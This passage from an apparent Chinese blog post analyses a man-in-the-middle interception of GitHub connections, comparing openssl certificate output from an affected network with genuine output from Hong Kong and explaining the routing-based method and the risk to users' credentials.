</span></span><span class="line"><span class="cl"> <span class="m">1</span> s:C <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
</span></span><span class="line"><span class="cl">   i:C <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
</span></span><span class="line"><span class="cl">-----BEGIN CERTIFICATE-----
</span></span><span class="line"><span class="cl">MIICNzCCAd2gAwIBAgIUD6UJah0ReDrJIuxhqrTa0CAAbAMwCgYIKoZIzj0EAwIw
</span></span><span class="line"><span class="cl">cTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoGA1UE
</span></span><span class="line"><span class="cl">CgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcNAQkB
</span></span><span class="line"><span class="cl">FhAzNDY2MDg0NTNAcXEuY29tMB4XDTE5MDkyNjA5MzIzN1oXDTI5MDkyMzA5MzIz
</span></span><span class="line"><span class="cl">N1owcTELMAkGA1UEBhMCQ04xCzAJBgNVBAgMAkdEMQswCQYDVQQHDAJTWjEMMAoG
</span></span><span class="line"><span class="cl">A1UECgwDQ09NMQwwCgYDVQQLDANOU1AxCzAJBgNVBAMMAkNBMR8wHQYJKoZIhvcN
</span></span><span class="line"><span class="cl">AQkBFhAzNDY2MDg0NTNAcXEuY29tMFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE
</span></span><span class="line"><span class="cl">qZ26n2ml6hcyf+NS0TP8PSZ1qlFzUb/tpr6Wb6zE9cSzkGOXej0ddI3sNvq/bLzk
</span></span><span class="line"><span class="cl">LLvaQLEzaIFyRDY6fcSQ36NTMFEwHQYDVR0OBBYEFKv8Ri5sjN4WZoaWvK/h9Yf+
</span></span><span class="line"><span class="cl">zhVyMB8GA1UdIwQYMBaAFKv8Ri5sjN4WZoaWvK/h9Yf+zhVyMA8GA1UdEwEB/wQF
</span></span><span class="line"><span class="cl">MAMBAf8wCgYIKoZIzj0EAwIDSAAwRQIhANFUxlZxx3dfmxEu1I0huK9eY/IPl6Xz
</span></span><span class="line"><span class="cl">AsUXUQZN2QPXAiACddgQK7I4I86sjPwjCMafPES9LkV/whcFV60LlAftaQ<span class="o">==</span>
</span></span><span class="line"><span class="cl">-----END CERTIFICATE-----
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Server certificate
</span></span><span class="line"><span class="cl"><span class="nv">subject</span><span class="o">=</span><span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> SERVER, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">issuer</span><span class="o">=</span><span class="nv">C</span> <span class="o">=</span> CN, <span class="nv">ST</span> <span class="o">=</span> GD, <span class="nv">L</span> <span class="o">=</span> SZ, <span class="nv">O</span> <span class="o">=</span> COM, <span class="nv">OU</span> <span class="o">=</span> NSP, <span class="nv">CN</span> <span class="o">=</span> CA, <span class="nv">emailAddress</span> <span class="o">=</span> 346608453@qq.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">No client certificate CA names sent
</span></span><span class="line"><span class="cl">Peer signing digest: SHA256
</span></span><span class="line"><span class="cl">Peer signature type: ECDSA
</span></span><span class="line"><span class="cl">Server Temp Key: X25519, <span class="m">253</span> bits
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">SSL handshake has <span class="nb">read</span> <span class="m">1499</span> bytes and written <span class="m">395</span> bytes
</span></span><span class="line"><span class="cl">Verification error: self signed certificate in certificate chain
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">New, TLSv1.2, Cipher is ECDHE-ECDSA-AES128-GCM-SHA256
</span></span><span class="line"><span class="cl">Server public key is <span class="m">256</span> bit
</span></span><span class="line"><span class="cl">Secure Renegotiation IS supported
</span></span><span class="line"><span class="cl">Compression: NONE
</span></span><span class="line"><span class="cl">Expansion: NONE
</span></span><span class="line"><span class="cl">No ALPN negotiated
</span></span><span class="line"><span class="cl">SSL-Session:
</span></span><span class="line"><span class="cl">    Protocol  : TLSv1.2
</span></span><span class="line"><span class="cl">    Cipher    : ECDHE-ECDSA-AES128-GCM-SHA256
</span></span><span class="line"><span class="cl">    Session-ID: 1A4A06D58F5DCC0FA80FFE4125AC12E555126BF8B7C7C627210B9C36F3B5A6ED
</span></span><span class="line"><span class="cl">    Session-ID-ctx:
</span></span><span class="line"><span class="cl">    Master-Key: 6BD176466BF93E52D592216063276369497FA26AFF0E7343A872FFA6E3F12BFF611BFDA4F5994F297ECC5772EE812305
</span></span><span class="line"><span class="cl">    PSK identity: None
</span></span><span class="line"><span class="cl">    PSK identity hint: None
</span></span><span class="line"><span class="cl">    SRP username: None
</span></span><span class="line"><span class="cl">    TLS session ticket lifetime hint: <span class="m">7200</span> <span class="o">(</span>seconds<span class="o">)</span>
</span></span><span class="line"><span class="cl">    TLS session ticket:
</span></span><span class="line"><span class="cl">    <span class="m">0000</span> - 7a 4c <span class="m">52</span> 3b d5 f6 1c c4-ea 0d <span class="m">86</span> <span class="m">45</span> <span class="m">37</span> 1a <span class="m">57</span> c4   zLR<span class="p">;</span>.......E7.W.
</span></span><span class="line"><span class="cl">    <span class="m">0010</span> - a5 <span class="m">47</span> 0e <span class="m">76</span> <span class="m">87</span> 9f f1 68-ac 6c <span class="m">37</span> e3 <span class="m">02</span> <span class="m">87</span> <span class="m">61</span> <span class="m">77</span>   .G.v...h.l7...aw
</span></span><span class="line"><span class="cl">    <span class="m">0020</span> - d9 c5 6a <span class="m">65</span> <span class="m">88</span> 3c <span class="m">44</span> e5-17 <span class="m">59</span> 5e <span class="m">30</span> de <span class="m">55</span> <span class="m">51</span> 4a   ..je.&lt;D..Y^0.UQJ
</span></span><span class="line"><span class="cl">    <span class="m">0030</span> - f4 9e <span class="m">51</span> c9 <span class="m">35</span> ee ff a9-62 <span class="m">60</span> a2 7d <span class="m">63</span> <span class="nb">fc</span> c1 f9   ..Q.5...b<span class="sb">`</span>.<span class="o">}</span>c...
</span></span><span class="line"><span class="cl">    <span class="m">0040</span> - a4 bf <span class="m">41</span> c5 2f <span class="m">42</span> 9a 7c-6d b0 <span class="m">99</span> <span class="m">49</span> <span class="m">63</span> 1c 0f 5c   ..A./B.<span class="p">|</span>m..Ic..<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="m">0050</span> - <span class="m">37</span> ce <span class="m">32</span> <span class="m">85</span> e6 fb <span class="m">49</span> 5a-01 <span class="m">97</span> 9d <span class="m">23</span> 6c c6 9e b3   7.2...IZ...#l...
</span></span><span class="line"><span class="cl">    <span class="m">0060</span> - <span class="m">56</span> dc ae c6 <span class="m">76</span> cf c6 ba-95 <span class="m">16</span> c6 c8 <span class="m">57</span> d1 be c7   V...v.......W...
</span></span><span class="line"><span class="cl">    <span class="m">0070</span> - d0 a3 f9 <span class="m">66</span> c6 4e a9 99-52 <span class="m">60</span> fe <span class="m">53</span> <span class="m">61</span> 9d <span class="m">15</span> b1   ...f.N..R<span class="sb">`</span>.Sa...
</span></span><span class="line"><span class="cl">    <span class="m">0080</span> - d2 1f a0 3c 0c <span class="m">78</span> <span class="m">41</span> af-d8 ac <span class="m">59</span> <span class="m">95</span> 9f c9 2f 1c   ...&lt;.xA...Y.../.
</span></span><span class="line"><span class="cl">    <span class="m">0090</span> - <span class="m">07</span> <span class="m">25</span> <span class="m">74</span> 3e ae <span class="m">28</span> <span class="m">03</span> 1f-1b fd 0d b4 f8 c3 ad 4f   .%t&gt;.<span class="o">(</span>.........O
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Start Time: <span class="m">1585268898</span>
</span></span><span class="line"><span class="cl">    Timeout   : <span class="m">7200</span> <span class="o">(</span>sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">    Verify <span class="k">return</span> code: <span class="m">19</span> <span class="o">(</span>self signed certificate in certificate chain<span class="o">)</span>
</span></span><span class="line"><span class="cl">    Extended master secret: yes
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">DONE
</span></span></code></pre></td></tr></table></div>
</div>
</div></details>
<h3 id="香港阿里云"><a href="#香港阿里云" class="header-mark headerLink">香港阿里云</a></h3>
<details>
  <summary>点击展开</summary>
<div class="highlight"><div class="chroma">
<div class="table-wrapper"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  ~ openssl s_client -showcerts -connect github.com:443 &lt; /dev/null
</span></span><span class="line"><span class="cl">CONNECTED<span class="o">(</span>00000005<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="nv">depth</span><span class="o">=</span><span class="m">2</span> <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert High Assurance EV Root CA
</span></span><span class="line"><span class="cl">verify <span class="k">return</span>:1
</span></span><span class="line"><span class="cl"><span class="nv">depth</span><span class="o">=</span><span class="m">1</span> <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert SHA2 Extended Validation Server CA
</span></span><span class="line"><span class="cl">verify <span class="k">return</span>:1
</span></span><span class="line"><span class="cl"><span class="nv">depth</span><span class="o">=</span><span class="m">0</span> <span class="nv">businessCategory</span> <span class="o">=</span> Private Organization, <span class="nv">jurisdictionC</span> <span class="o">=</span> US, <span class="nv">jurisdictionST</span> <span class="o">=</span> Delaware, <span class="nv">serialNumber</span> <span class="o">=</span> 5157550, <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">ST</span> <span class="o">=</span> California, <span class="nv">L</span> <span class="o">=</span> San Francisco, <span class="nv">O</span> <span class="o">=</span> <span class="s2">&#34;GitHub, Inc.&#34;</span>, <span class="nv">CN</span> <span class="o">=</span> github.com
</span></span><span class="line"><span class="cl">verify <span class="k">return</span>:1
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Certificate chain
</span></span><span class="line"><span class="cl"> <span class="m">0</span> s:businessCategory <span class="o">=</span> Private Organization, <span class="nv">jurisdictionC</span> <span class="o">=</span> US, <span class="nv">jurisdictionST</span> <span class="o">=</span> Delaware, <span class="nv">serialNumber</span> <span class="o">=</span> 5157550, <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">ST</span> <span class="o">=</span> California, <span class="nv">L</span> <span class="o">=</span> San Francisco, <span class="nv">O</span> <span class="o">=</span> <span class="s2">&#34;GitHub, Inc.&#34;</span>, <span class="nv">CN</span> <span class="o">=</span> github.com
</span></span><span class="line"><span class="cl">   i:C <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert SHA2 Extended Validation Server CA
</span></span><span class="line"><span class="cl">-----BEGIN CERTIFICATE-----
</span></span><span class="line"><span class="cl">MIIHQjCCBiqgAwIBAgIQCgYwQn9bvO1pVzllk7ZFHzANBgkqhkiG9w0BAQsFADB1
</span></span><span class="line"><span class="cl">MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3
</span></span><span class="line"><span class="cl">d3cuZGlnaWNlcnQuY29tMTQwMgYDVQQDEytEaWdpQ2VydCBTSEEyIEV4dGVuZGVk
</span></span><span class="line"><span class="cl">IFZhbGlkYXRpb24gU2VydmVyIENBMB4XDTE4MDUwODAwMDAwMFoXDTIwMDYwMzEy
</span></span><span class="line"><span class="cl">MDAwMFowgccxHTAbBgNVBA8MFFByaXZhdGUgT3JnYW5pemF0aW9uMRMwEQYLKwYB
</span></span><span class="line"><span class="cl">BAGCNzwCAQMTAlVTMRkwFwYLKwYBBAGCNzwCAQITCERlbGF3YXJlMRAwDgYDVQQF
</span></span><span class="line"><span class="cl">Ewc1MTU3NTUwMQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQG
</span></span><span class="line"><span class="cl">A1UEBxMNU2FuIEZyYW5jaXNjbzEVMBMGA1UEChMMR2l0SHViLCBJbmMuMRMwEQYD
</span></span><span class="line"><span class="cl">VQQDEwpnaXRodWIuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
</span></span><span class="line"><span class="cl">xjyq8jyXDDrBTyitcnB90865tWBzpHSbindG/XqYQkzFMBlXmqkzC+FdTRBYyneZ
</span></span><span class="line"><span class="cl">w5Pz+XWQvL+74JW6LsWNc2EF0xCEqLOJuC9zjPAqbr7uroNLghGxYf13YdqbG5oj
</span></span><span class="line"><span class="cl">/4x+ogEG3dF/U5YIwVr658DKyESMV6eoYV9mDVfTuJastkqcwero+5ZAKfYVMLUE
</span></span><span class="line"><span class="cl">sMwFtoTDJFmVf6JlkOWwsxp1WcQ/MRQK1cyqOoUFUgYylgdh3yeCDPeF22Ax8AlQ
</span></span><span class="line"><span class="cl">xbcaI+GwfQL1FB7Jy+h+KjME9lE/UpgV6Qt2R1xNSmvFCBWu+NFX6epwFP/JRbkM
</span></span><span class="line"><span class="cl">fLz0beYFUvmMgLtwVpEPSwIDAQABo4IDeTCCA3UwHwYDVR0jBBgwFoAUPdNQpdag
</span></span><span class="line"><span class="cl">re7zSmAKZdMh1Pj41g8wHQYDVR0OBBYEFMnCU2FmnV+rJfQmzQ84mqhJ6kipMCUG
</span></span><span class="line"><span class="cl">A1UdEQQeMByCCmdpdGh1Yi5jb22CDnd3dy5naXRodWIuY29tMA4GA1UdDwEB/wQE
</span></span><span class="line"><span class="cl">AwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwdQYDVR0fBG4wbDA0
</span></span><span class="line"><span class="cl">oDKgMIYuaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItZXYtc2VydmVyLWcy
</span></span><span class="line"><span class="cl">LmNybDA0oDKgMIYuaHR0cDovL2NybDQuZGlnaWNlcnQuY29tL3NoYTItZXYtc2Vy
</span></span><span class="line"><span class="cl">dmVyLWcyLmNybDBLBgNVHSAERDBCMDcGCWCGSAGG/WwCATAqMCgGCCsGAQUFBwIB
</span></span><span class="line"><span class="cl">FhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BTMAcGBWeBDAEBMIGIBggrBgEF
</span></span><span class="line"><span class="cl">BQcBAQR8MHowJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBS
</span></span><span class="line"><span class="cl">BggrBgEFBQcwAoZGaHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0
</span></span><span class="line"><span class="cl">U0hBMkV4dGVuZGVkVmFsaWRhdGlvblNlcnZlckNBLmNydDAMBgNVHRMBAf8EAjAA
</span></span><span class="line"><span class="cl">MIIBfgYKKwYBBAHWeQIEAgSCAW4EggFqAWgAdgCkuQmQtBhYFIe7E6LMZ3AKPDWY
</span></span><span class="line"><span class="cl">BPkb37jjd80OyA3cEAAAAWNBYm0KAAAEAwBHMEUCIQDRZp38cTWsWH2GdBpe/uPT
</span></span><span class="line"><span class="cl">Wnsu/m4BEC2+dIcvSykZYgIgCP5gGv6yzaazxBK2NwGdmmyuEFNSg2pARbMJlUFg
</span></span><span class="line"><span class="cl">U5UAdgBWFAaaL9fC7NP14b1Esj7HRna5vJkRXMDvlJhV1onQ3QAAAWNBYm0tAAAE
</span></span><span class="line"><span class="cl">AwBHMEUCIQCi7omUvYLm0b2LobtEeRAYnlIo7n6JxbYdrtYdmPUWJQIgVgw1AZ51
</span></span><span class="line"><span class="cl">vK9ENinBg22FPxb82TvNDO05T17hxXRC2IYAdgC72d+8H4pxtZOUI5eqkntHOFeV
</span></span><span class="line"><span class="cl">CqtS6BqQlmQ2jh7RhQAAAWNBYm3fAAAEAwBHMEUCIQChzdTKUU2N+XcqcK0OJYrN
</span></span><span class="line"><span class="cl">8EYynloVxho4yPk6Dq3EPgIgdNH5u8rC3UcslQV4B9o0a0w204omDREGKTVuEpxG
</span></span><span class="line"><span class="cl">eOQwDQYJKoZIhvcNAQELBQADggEBAHAPWpanWOW/ip2oJ5grAH8mqQfaunuCVE+v
</span></span><span class="line"><span class="cl">ac+88lkDK/LVdFgl2B6kIHZiYClzKtfczG93hWvKbST4NRNHP9LiaQqdNC17e5vN
</span></span><span class="line"><span class="cl">HnXVUGw+yxyjMLGqkgepOnZ2Rb14kcTOGp4i5AuJuuaMwXmCo7jUwPwfLe1NUlVB
</span></span><span class="line"><span class="cl">Kqg6LK0Hcq4K0sZnxE8HFxiZ92WpV2AVWjRMEc/2z2shNoDvxvFUYyY1Oe67xINk
</span></span><span class="line"><span class="cl">myQKc+ygSBZzyLnXSFVWmHr3u5dcaaQGGAR42v6Ydr4iL38Hd4dOiBma+FXsXBIq
</span></span><span class="line"><span class="cl">WUjbST4VXmdaol7uzFMojA4zkxQDZAvF5XgJlAFadfySna/teik<span class="o">=</span>
</span></span><span class="line"><span class="cl">-----END CERTIFICATE-----
</span></span><span class="line"><span class="cl"> <span class="m">1</span> s:C <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert SHA2 Extended Validation Server CA
</span></span><span class="line"><span class="cl">   i:C <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert High Assurance EV Root CA
</span></span><span class="line"><span class="cl">-----BEGIN CERTIFICATE-----
</span></span><span class="line"><span class="cl">MIIEtjCCA56gAwIBAgIQDHmpRLCMEZUgkmFf4msdgzANBgkqhkiG9w0BAQsFADBs
</span></span><span class="line"><span class="cl">MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3
</span></span><span class="line"><span class="cl">d3cuZGlnaWNlcnQuY29tMSswKQYDVQQDEyJEaWdpQ2VydCBIaWdoIEFzc3VyYW5j
</span></span><span class="line"><span class="cl">ZSBFViBSb290IENBMB4XDTEzMTAyMjEyMDAwMFoXDTI4MTAyMjEyMDAwMFowdTEL
</span></span><span class="line"><span class="cl">MAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3
</span></span><span class="line"><span class="cl">LmRpZ2ljZXJ0LmNvbTE0MDIGA1UEAxMrRGlnaUNlcnQgU0hBMiBFeHRlbmRlZCBW
</span></span><span class="line"><span class="cl">YWxpZGF0aW9uIFNlcnZlciBDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC
</span></span><span class="line"><span class="cl">ggEBANdTpARR+JmmFkhLZyeqk0nQOe0MsLAAh/FnKIaFjI5j2ryxQDji0/XspQUY
</span></span><span class="line"><span class="cl">uD0+xZkXMuwYjPrxDKZkIYXLBxA0sFKIKx9om9KxjxKws9LniB8f7zh3VFNfgHk/
</span></span><span class="line"><span class="cl">LhqqqB5LKw2rt2O5Nbd9FLxZS99RStKh4gzikIKHaq7q12TWmFXo/a8aUGxUvBHy
</span></span><span class="line"><span class="cl">/Urynbt/DvTVvo4WiRJV2MBxNO723C3sxIclho3YIeSwTQyJ3DkmF93215SF2AQh
</span></span><span class="line"><span class="cl">cJ1vb/9cuhnhRctWVyh+HA1BV6q3uCe7seT6Ku8hI3UarS2bhjWMnHe1c63YlC3k
</span></span><span class="line"><span class="cl">8wyd7sFOYn4XwHGeLN7x+RAoGTMCAwEAAaOCAUkwggFFMBIGA1UdEwEB/wQIMAYB
</span></span><span class="line"><span class="cl">Af8CAQAwDgYDVR0PAQH/BAQDAgGGMB0GA1UdJQQWMBQGCCsGAQUFBwMBBggrBgEF
</span></span><span class="line"><span class="cl">BQcDAjA0BggrBgEFBQcBAQQoMCYwJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRp
</span></span><span class="line"><span class="cl">Z2ljZXJ0LmNvbTBLBgNVHR8ERDBCMECgPqA8hjpodHRwOi8vY3JsNC5kaWdpY2Vy
</span></span><span class="line"><span class="cl">dC5jb20vRGlnaUNlcnRIaWdoQXNzdXJhbmNlRVZSb290Q0EuY3JsMD0GA1UdIAQ2
</span></span><span class="line"><span class="cl">MDQwMgYEVR0gADAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2VydC5j
</span></span><span class="line"><span class="cl">b20vQ1BTMB0GA1UdDgQWBBQ901Cl1qCt7vNKYApl0yHU+PjWDzAfBgNVHSMEGDAW
</span></span><span class="line"><span class="cl">gBSxPsNpA/i/RwHUmCYaCALvY2QrwzANBgkqhkiG9w0BAQsFAAOCAQEAnbbQkIbh
</span></span><span class="line"><span class="cl">hgLtxaDwNBx0wY12zIYKqPBKikLWP8ipTa18CK3mtlC4ohpNiAexKSHc59rGPCHg
</span></span><span class="line"><span class="cl">4xFJcKx6HQGkyhE6V6t9VypAdP3THYUYUN9XR3WhfVUgLkc3UHKMf4Ib0mKPLQNa
</span></span><span class="line"><span class="cl">2sPIoc4sUqIAY+tzunHISScjl2SFnjgOrWNoPLpSgVh5oywM395t6zHyuqB8bPEs
</span></span><span class="line"><span class="cl">1OG9d4Q3A84ytciagRpKkk47RpqF/oOi+Z6Mo8wNXrM9zwR4jxQUezKcxwCmXMS1
</span></span><span class="line"><span class="cl">oVWNWlZopCJwqjyBcdmdqEU79OX2olHdx3ti6G8MdOu42vi/hw15UJGQmxg7kVkn
</span></span><span class="line"><span class="cl"><span class="nv">8TUoE6smftX3eg</span><span class="o">==</span>
</span></span><span class="line"><span class="cl">-----END CERTIFICATE-----
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Server certificate
</span></span><span class="line"><span class="cl"><span class="nv">subject</span><span class="o">=</span><span class="nv">businessCategory</span> <span class="o">=</span> Private Organization, <span class="nv">jurisdictionC</span> <span class="o">=</span> US, <span class="nv">jurisdictionST</span> <span class="o">=</span> Delaware, <span class="nv">serialNumber</span> <span class="o">=</span> 5157550, <span class="nv">C</span> <span class="o">=</span> US, <span class="nv">ST</span> <span class="o">=</span> California, <span class="nv">L</span> <span class="o">=</span> San Francisco, <span class="nv">O</span> <span class="o">=</span> <span class="s2">&#34;GitHub, Inc.&#34;</span>, <span class="nv">CN</span> <span class="o">=</span> github.com
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">issuer</span><span class="o">=</span><span class="nv">C</span> <span class="o">=</span> US, <span class="nv">O</span> <span class="o">=</span> DigiCert Inc, <span class="nv">OU</span> <span class="o">=</span> www.digicert.com, <span class="nv">CN</span> <span class="o">=</span> DigiCert SHA2 Extended Validation Server CA
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">No client certificate CA names sent
</span></span><span class="line"><span class="cl">Peer signing digest: SHA256
</span></span><span class="line"><span class="cl">Peer signature type: RSA-PSS
</span></span><span class="line"><span class="cl">Server Temp Key: X25519, <span class="m">253</span> bits
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">SSL handshake has <span class="nb">read</span> <span class="m">3621</span> bytes and written <span class="m">376</span> bytes
</span></span><span class="line"><span class="cl">Verification: OK
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">New, TLSv1.3, Cipher is TLS_AES_128_GCM_SHA256
</span></span><span class="line"><span class="cl">Server public key is <span class="m">2048</span> bit
</span></span><span class="line"><span class="cl">Secure Renegotiation IS NOT supported
</span></span><span class="line"><span class="cl">Compression: NONE
</span></span><span class="line"><span class="cl">Expansion: NONE
</span></span><span class="line"><span class="cl">No ALPN negotiated
</span></span><span class="line"><span class="cl">Early data was not sent
</span></span><span class="line"><span class="cl">Verify <span class="k">return</span> code: <span class="m">0</span> <span class="o">(</span>ok<span class="o">)</span>
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">DONE
</span></span></code></pre></td></tr></table></div>
</div>
</div></details>
<h2 id="实施手段"><a href="#实施手段" class="header-mark headerLink">实施手段</a></h2>
<p>通过检查网络和对出现的状况的分析，我认为这次MITM不是通过sni或者返回的证书进行的，而是直接针对某些ip的443端口进行的</p>
<p>通过控制这些ip的路由，让流量经过某些恶意节点，在某个恶意节点针对443端口进行MITM，而不检查实际访问的域名和返回的证书</p>
<p>并且这次事件所影响的github的ip并不全，通过doh或dot获取到国外服务器解析到的ip而不是国内使用的几个ip，可以正常访问github</p>
<h2 id="危害"><a href="#危害" class="header-mark headerLink">危害</a></h2>
<p>使用TLS是保证我们访问网站时信息不被中间人窥探和篡改的有效手段，如果TLS用来加密通讯使用的证书出现问题，那么信息安全就无从谈起</p>
<p>TLS使用公钥密码算法交换后面数据进行对称加密使用的秘钥，作为中间人没有服务器上的私钥就无法解密获得后面加密使用的秘钥，所以即使截获到https的数据报文，也无法解密和篡改传输的内容</p>
<p>而本次事件使用的手法是MITM常用手法，通常情况下我们为了抓包和改包，会自己签署一个假的证书并导入自己被抓包设备的信任证书列表，然后中间人分别与服务器和客户端建立TLS连接，简单来说，中间人作为客户端从服务器获取内容，然后作为服务器向真正的客户端传输修改后的内容</p>
<p>所以如果我们信任了浏览器给出的警告，就会导致我们的信息包括github用户名、邮箱、密码、token和私有库泄露</p>
<h2 id="如何防范"><a href="#如何防范" class="header-mark headerLink">如何防范</a></h2>
